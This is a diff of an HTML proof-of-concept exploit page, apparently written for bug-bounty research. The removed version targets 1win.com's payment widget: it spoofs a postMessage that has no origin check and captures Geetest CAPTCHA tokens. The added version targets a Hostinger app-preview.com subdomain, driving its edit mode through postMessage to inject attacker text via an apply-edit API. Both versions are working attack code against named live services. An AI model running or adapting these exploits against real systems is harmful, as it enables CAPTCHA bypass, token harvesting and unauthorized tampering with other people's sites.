@@ -1,102 +1,114 @@
 <!DOCTYPE html>
-<!--
-  PoC 1: __WIDGET_REDIRECT_FORM_READY__ No-Origin-Check → Deposit Flow Hijack
-
-  VULNERABILITY: Ch() in /paywidget/assets/index-CCDnOddw.js listens for
-  "__WIDGET_REDIRECT_FORM_READY__" with NO origin check.
-
-  FLOW:
-    1. Attacker opens paywidget as popup (becomes window.opener)
-    2. Attacker sends __WIDGET_REDIRECT_FORM_READY__ to paywidget
-    3. Ch() resolves — paywidget thinks parent is ready, unblocks deposit creation
-    4. Paywidget sends geetestResult back to window.opener (attacker) with targetOrigin="*"
-    5. Attacker harvests Geetest CAPTCHA token
-
-  REQUIRES: Victim is logged into 1win.com (cookies present)
-  IMPACT: CAPTCHA bypass tokens harvested, deposit flow unblocked by untrusted party
--->
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>PoC 1 - WIDGET_READY Spoof + Geetest Harvest</title>
+  <title>PoC - Hostinger app-preview postMessage no origin check</title>
   <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
-    h2 { color: #ff0; }
-    #log { background: #000; border: 1px solid #0f0; padding: 10px; height: 400px; overflow-y: auto; }
-    .evt { color: #0ff; } .warn { color: #ff0; } .hit { color: #f00; font-weight: bold; }
-    button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; margin: 4px; }
+    body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
+    #log { background: #000; padding: 10px; height: 200px; overflow-y: auto; border: 1px solid #0f0; }
+    iframe { width: 100%; height: 500px; border: 2px solid red; }
+    button { background: #0f0; color: #000; border: none; padding: 8px 16px; margin: 4px; cursor: pointer; font-weight: bold; }
+    #attacker-text { background: #000; color: #f90; border: 1px solid #f90; padding: 6px 10px; font-family: monospace; font-size: 14px; width: 420px; }
+    label { color: #aaa; font-size: 13px; }
+    .note { color: #666; font-size: 12px; margin: 4px 0 8px; }
   </style>
 </head>
 <body>
-  <h2>PoC 1 — __WIDGET_REDIRECT_FORM_READY__ No-Origin-Check</h2>
-  <p>Target: <code>https://1win.com/paywidget/form</code></p>
-  <button onclick="runPoC()">Run PoC</button>
-  <button onclick="clearLog()">Clear</button>
+  <h2>PoC: app-preview.com postMessage — no origin check</h2>
+  <p>Origin of THIS page: <strong id="origin"></strong></p>
+  <p>Target iframe: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong></p>
+
+  <p>
+    <label>Attacker payload (newText):</label><br>
+    <input id="attacker-text" type="text" value="PWNED BY ATTACKER — postMessage no origin check" />
+  </p>
+
+  <div>
+    <button onclick="sendMsg('enable-edit-mode')">1. enable-edit-mode</button>
+    <button onclick="sendMsg('enableSelectionMode')">2. enableSelectionMode</button>
+    <button onclick="sendEditSave()">3. edit-save</button>
+    <button onclick="sendMsg('disable-edit-mode')">4. disable-edit-mode</button>
+    <button onclick="sendAll()">RUN ALL (auto)</button>
+    <button onclick="resetIframe()" style="background:#444;color:#ccc;">↺ Reset</button>
+  </div>
+  <p class="note">
+    Manual flow: click 1 → click 2 → click any text inside the iframe → click 3<br>
+    Auto flow: RUN ALL (requires clicking a text element in the iframe within the 3s window)
+  </p>
+
   <div id="log"></div>
 
-<script>
-const TARGET = 'https://1win.com';
-const WIDGET_READY = '__WIDGET_REDIRECT_FORM_READY__';
-let paywidgetWindow = null;
+  <iframe id="target" src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/"></iframe>
 
-function log(msg, cls = '') {
-  const d = document.getElementById('log');
-  const ts = new Date().toISOString().slice(11, 23);
-  d.innerHTML += `<div class="${cls}">[${ts}] ${msg}</div>`;
-  d.scrollTop = d.scrollHeight;
-}
+  <script>
+    document.getElementById('origin').textContent = window.location.origin;
 
-// Listen for ALL messages from any origin (including the paywidget)
-window.addEventListener('message', function(e) {
-  log(`RECEIVED message from origin: <b>${e.origin}</b>`, 'evt');
-  log(`  data: ${JSON.stringify(e.data)}`, 'evt');
+    const logEl = document.getElementById('log');
+    const iframe = document.getElementById('target');
+    const TARGET = 'https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/';
 
-  // This is what we're after: paywidget sends geetestResult to opener (us) with NO targetOrigin
-  if (e.data && e.data.type === 'geetestResult') {
-    log(`[!!! HIT !!!] Geetest token captured from ${e.origin}`, 'hit');
-    log(`  payload: ${JSON.stringify(e.data.payload)}`, 'hit');
-  }
+    const log = (msg) => {
+      const ts = new Date().toISOString().split('T')[1].slice(0, 12);
+      logEl.innerHTML += `[${ts}] ${msg}<br>`;
+      logEl.scrollTop = logEl.scrollHeight;
+    };
 
-  // Also catch any redirect messages leaking from paywidget
-  if (e.data && e.data.type === 'redirect') {
-    log(`[!!! HIT !!!] Redirect URL captured: ${e.data.payload?.url}`, 'hit');
-  }
-});
+    function getPayload() {
+      return document.getElementById('attacker-text').value;
+    }
 
-function runPoC() {
-  log('Opening paywidget as popup (attacker becomes window.opener)...', 'warn');
+    function sendMsg(type, payload) {
+      const msg = payload !== undefined ? { type, payload } : { type };
+      iframe.contentWindow.postMessage(msg, '*');
+      log(`SENT → type="${type}" payload=${JSON.stringify(payload ?? null)}`);
+    }
 
-  // Real URL discovered from billing.js source:
-  // window.open(`/paywidget/form?locale=${lang}&origin_type=${k}`)
-  // Only needs locale + origin_type — auth is via session cookies
-  paywidgetWindow = window.open(
-    TARGET + '/paywidget/form?locale=en&origin_type=deposit',
-    'paywidget',
-    'width=500,height=700,left=100,top=100'
-  );
+    function sendEditSave() {
+      sendMsg('edit-save', { newText: getPayload() });
+    }
 
-  if (!paywidgetWindow) {
-    log('Popup blocked! Allow popups for this page.', 'warn');
-    return;
-  }
+    function resetIframe() {
+      log('--- Resetting iframe ---');
+      iframe.src = TARGET + '?t=' + Date.now();
+    }
 
-  log('Popup opened. Waiting 3s for paywidget to load...', 'warn');
+    function sendAll() {
+      log('--- Starting attack sequence ---');
+      setTimeout(() => sendMsg('enable-edit-mode'), 500);
+      setTimeout(() => sendMsg('enableSelectionMode'), 1000);
+      // edit-save fires at 4s — click a text element in the iframe before then
+      setTimeout(() => sendEditSave(), 4000);
+      setTimeout(() => log('--- Sequence complete. Check DevTools → Network → /api/apply-edit ---'), 4500);
+    }
 
-  // Give paywidget time to set up its Ch() listener
-  setTimeout(() => {
-    log(`Sending spoofed "${WIDGET_READY}" to paywidget with targetOrigin="*"...`, 'warn');
+    // Listen for messages from the iframe
+    window.addEventListener('message', (event) => {
+      if (!event.origin.includes('app-preview')) return;
 
-    // Ch() in paywidget has NO origin check — any sender works
-    paywidgetWindow.postMessage(WIDGET_READY, '*');
+      const type = event.data?.type || event.data?.message;
+      log(`RECEIVED ← origin="${event.origin}" type="${type}" data=${JSON.stringify(event.data).slice(0, 200)}`);
 
-    log('Message sent! Waiting for paywidget to send geetestResult back to us (window.opener)...', 'warn');
-    log('(paywidget uses window.opener.postMessage with no targetOrigin)', 'warn');
-  }, 3000);
-}
+      // editEnter: element was clicked, currentEditingInfo is set — fire edit-save immediately
+      if (type === 'editEnter') {
+        const currentText = event.data?.payload?.currentText;
+        log(`>>> editEnter! currentText="${currentText}" — auto-firing edit-save`);
+        setTimeout(() => sendEditSave(), 200);
+      }
 
-function clearLog() {
-  document.getElementById('log').innerHTML = '';
-}
-</script>
+      if (type === 'editApplied') {
+        log(`>>> SUCCESS — editApplied! editId="${event.data?.payload?.editId}"`);
+      }
+
+      if (type === 'route-changed') {
+        log('--- route-changed: HMR reloaded. Click ↺ Reset then redo. ---');
+      }
+    });
+
+    iframe.addEventListener('load', () => {
+      log('iframe loaded ✓ — ready to send messages');
+      log('This origin (' + window.location.origin + ') is NOT in ALLOWED_PARENT_ORIGINS');
+    });
+
+    log('PoC loaded.');
+  </script>
 </body>
 </html>
